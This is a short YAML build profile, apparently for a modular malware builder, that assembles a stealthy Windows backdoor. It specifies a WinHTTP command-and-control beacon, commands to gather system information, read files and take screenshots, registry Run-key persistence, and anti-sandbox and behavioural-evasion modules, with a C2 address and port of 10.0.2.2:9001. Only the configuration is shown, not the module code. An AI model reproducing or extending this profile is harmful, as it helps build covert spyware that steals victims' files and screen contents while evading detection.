name: backdoor_http_stealth
description: WinHTTP backdoor — minimal API commands, max stealth profile

core:
  - core/emit_buffer
  - core/file_ops

c2: c2/winhttp_beacon

commands:
  - commands/cmd_sysinfo
  - commands/cmd_fileread
  - commands/cmd_screenshot

arch: arch/backdoor
persist: persist/registry_run

evasion:
  - evasion/behavioral_pacing
  - evasion/anti_sandbox
  - evasion/triggered_exec

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
  BEACON_INTERVAL_MS: "60000"
